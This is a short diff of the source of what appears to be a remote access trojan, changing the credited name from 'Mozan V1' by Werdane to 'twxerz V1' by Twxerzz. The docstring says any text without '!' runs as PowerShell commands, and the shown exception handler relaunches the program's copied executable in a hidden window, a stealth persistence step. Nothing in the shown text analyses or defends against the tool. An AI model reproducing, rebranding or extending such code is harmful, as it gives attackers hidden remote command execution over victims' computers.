@@ -1,6 +1,6 @@
 """
-Mozan V1 🐀🤑
-made by Werdane
+twxerz V1 🐀
+made by Twxerzz
 
 Commands:
 (Any text without '!' at the begining would be treated as powershell commands)
@@ -1007,3 +1007,4 @@ except Exception as e:
     logging.critical(f"Traceback: {traceback.format_exc()}")
 except SystemExit:
     subprocess.Popen([destination_path], creationflags=subprocess.CREATE_NO_WINDOW)
+
